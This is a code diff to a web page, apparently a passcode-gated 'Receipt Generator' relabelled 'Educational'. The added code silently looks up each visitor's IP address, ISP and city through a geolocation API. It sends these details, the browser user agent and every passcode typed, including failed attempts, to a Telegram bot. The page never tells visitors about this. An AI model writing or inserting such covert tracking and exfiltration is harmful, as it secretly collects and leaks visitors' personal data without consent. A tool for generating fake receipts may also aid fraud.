@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Receipt Generator</title>
+<title>Educational Receipt Generator</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 
 <style>
@@ -272,11 +272,37 @@ function notifyTelegram(msg) {
     fetch(url).catch(e => console.log(e));
 }
 
-window.onload = () => { notifyTelegram("🚀 App opened"); };
+// Function to fetch advanced network and location details
+async function getVisitorInfo() {
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        return {
+            ip: data.ip || "Unknown",
+            network: data.org || "Unknown Provider",
+            city: data.city || "Unknown City",
+            region: data.region || "Unknown Region",
+            country: data.country_name || "Unknown Country"
+        };
+    } catch (e) {
+        return { ip: "Error", network: "Error", city: "Error", region: "Error", country: "Error" };
+    }
+}
 
-function checkPasscode() {
+window.onload = async () => { 
+    const info = await getVisitorInfo();
+    notifyTelegram(`🚀 *App Opened*\n📍 Location: ${info.city}, ${info.region}\n🌐 Network: ${info.network}\n🔗 IP: ${info.ip}\n📱 Device: ${navigator.userAgent}`);
+};
+
+async function checkPasscode() {
     const input = document.getElementById("passInput");
-    if (input.value === "$$$$") {
+    const enteredPass = input.value;
+    const info = await getVisitorInfo();
+    
+    const status = (enteredPass === "$$$$") ? "✅ SUCCESS" : "❌ FAILED";
+    notifyTelegram(`🔑 *Login Attempt*\nStatus: ${status}\nEntered: ${enteredPass}\n📍 Location: ${info.city}\n🌐 Network: ${info.network}\n🔗 IP: ${info.ip}`);
+
+    if (enteredPass === "$$$$") {
         document.getElementById("passcodeGate").style.display = "none";
         document.getElementById("mainApp").classList.remove("hidden");
     } else {
